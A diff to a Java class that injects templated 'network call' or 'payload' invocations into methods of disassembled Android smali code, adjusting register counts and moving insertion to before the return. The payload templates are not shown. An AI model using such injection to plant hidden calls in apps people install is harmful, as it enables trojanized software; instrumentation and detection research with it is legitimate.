@@ -131,8 +131,6 @@ public class CallInjector {
 
 	private StringBuffer injectCallInMethod(File file, String method,
 			Set<String> payloads) throws FileNotFoundException {
-		log.debug("Injecting in method " + method + " of "
-				+ file.getAbsolutePath());
 		StringBuffer res = new StringBuffer();
 		Scanner sc = new Scanner(file);
 		String line = "";
@@ -148,44 +146,95 @@ public class CallInjector {
 			switch (state) {
 			case MATCH_METHOD:
 				matcher = methodPattern.matcher(line);
-				if (matcher.matches())
+				if (matcher.matches() && !line.contains(" static ")) {
+					log.debug("Method matched in class "
+							+ file.getAbsolutePath() + ": " + line);
 					state = State.MATCH_LOCALS;
+				} else if (matcher.matches())
+					log.debug("Skipping method " + method + " in class "
+							+ file.getAbsolutePath()
+							+ " because it is static. Looking for another one.");
 				break;
 			case MATCH_LOCALS:
 				matcher = localsPattern.matcher(line);
 				if (matcher.matches()) {
 					locals = Integer.parseInt(matcher.group(1));
-					if (payloads != null && payloads.size() > 0) {
-						if (locals == 0)
-							locals = 1; // almeno 1 local serve sempre
+					if (locals < 16 && payloads != null && payloads.size() > 0) {
+						locals++;
+						log.debug("Setting \".locals " + locals + "\" (it was "
+								+ (locals - 1) + ") for method " + method
+								+ " in class " + file.getAbsolutePath());
+//						if (locals == 0) {
+//							locals = 1; // almeno 1 local serve sempre
+//							log.debug("Setting \".locals 1\" (it was 0) for method "
+//									+ method
+//									+ " in class "
+//									+ file.getAbsolutePath());
+//						} else
+//							log.debug("Leaving \".locals " + locals
+//									+ "\" unmodified for method " + method
+//									+ " in class " + file.getAbsolutePath());
 						line = "    .locals " + locals;
+					}else if(locals>=16){
+						log.debug("Skipping locals modification because it is >= 16");
 					}
-					state = State.MATCH_PROLOGUE;
+					state = State.MATCH_RETURN;
 				}
 				break;
 			case MATCH_PROLOGUE:
 				matcher = prologuePattern.matcher(line);
 				if (matcher.matches()) {
-					if (payloads == null) {
-						line = line + "\n" + smaliNetworkCall;
-					} else {
-						for (String payload : payloads) {
-							line = line
-									+ "\n"
-									+ smaliPayloadCall.replaceAll(
-											"\\$\\{var_id\\}", 0 + "")
-											.replaceAll(
-													"\\$\\{payload_class\\}",
-													payload);
-						}
-					}
+					// if (locals <= 16) {
+					// if (payloads == null) {
+					// line = line + "\n" + smaliNetworkCall;
+					// } else {
+					// for (String payload : payloads) {
+					// line = line
+					// + "\n"
+					// + smaliPayloadCall
+					// .replaceAll("\\$\\{var_id\\}",
+					// 0 + "")
+					// .replaceAll(
+					// "\\$\\{payload_class\\}",
+					// payload);
+					// }
+					// }
+					// }
 					state = State.MATCH_RETURN;
 				}
 				break;
 			case MATCH_RETURN:
 				matcher = returnPattern.matcher(line);
-				if (matcher.matches())
-					state = State.INJECTION_DONE;
+				if (matcher.matches()) {
+					if (locals <= 16) {
+						if (payloads == null) {
+							log.debug("Injecting network call in method "
+									+ method + " of class "
+									+ file.getAbsolutePath());
+							res.append(smaliNetworkCall + "\n");
+						} else {
+							if (payloads.size() == 0)
+								log.debug("No payloads to inject in method "
+										+ method + " of class "
+										+ file.getAbsolutePath());
+							for (String payload : payloads) {
+								log.debug("Injecting payload call " + payload
+										+ " in method " + method + " of class "
+										+ file.getAbsolutePath());
+								res.append(smaliPayloadCall.replaceAll(
+										"\\$\\{var_id\\}", (locals-1) + "").replaceAll(
+										"\\$\\{payload_class\\}", payload)
+										+ "\n");
+							}
+						}
+						state = State.INJECTION_DONE;
+					} else {
+						log.debug("Skipping injection in method " + method
+								+ " of class " + file.getAbsolutePath()
+								+ " because of too many locals. Looking for another one.");
+						state = State.MATCH_METHOD;
+					}
+				}
 				break;
 			case INJECTION_DONE:
 				break;
@@ -194,6 +243,13 @@ public class CallInjector {
 			if (sc.hasNextLine())
 				res.append("\n");
 		}
+		if (state == State.MATCH_METHOD)
+			log.debug("No non-static methods " + method + " found in class "
+					+ file.getAbsolutePath());
+		if (state == State.MATCH_RETURN || state == State.MATCH_LOCALS
+				|| state == State.MATCH_PROLOGUE)
+			log.error("Invalid exit state (" + state + ") for method " + method
+					+ " in class " + file.getAbsolutePath());
 		sc.close();
 		return res;
 
@@ -221,7 +277,7 @@ public class CallInjector {
 	}
 
 	private static Pattern buildMethodPattern(String method) {
-		return Pattern.compile("^\\s*\\.method\\s.*(?!static).*" + method
+		return Pattern.compile("^\\s*\\.method\\s.*" + method
 				+ "\\s*\\(.*\\)\\s*(.+)\\s*$");
 	}
 
